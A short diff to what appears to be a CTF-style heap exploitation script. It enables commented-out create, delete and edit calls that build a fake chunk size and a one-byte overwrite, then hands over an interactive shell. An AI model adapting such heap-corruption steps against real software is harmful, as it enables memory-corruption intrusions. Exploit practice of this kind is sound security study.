@@ -79,14 +79,14 @@ def exploit(p,e,l):
     delete(p,0)
     delete(p,1)
 
-    #create(p, 0x508, b"B" * 0x4f0 + p64(0x280) + b"B" * 0x10)
-    #create(p, 0x88, b"C" * 0x88)
+    create(p, 0x508, b"B" * 0x4f0 + p64(0x280) + b"B" * 0x10)
+    create(p, 0x88, b"C" * 0x88)
 
-    #delete(p, 2)
-    #edit(p, 1, b"\x11")
+    delete(p, 2)
+    edit(p, 1, b"\x11")
 
 
-    #create(p, 0x288, b"1" * 0x278)
+    create(p, 0x288, b"1" * 0x278)
 
     p.interactive()
 
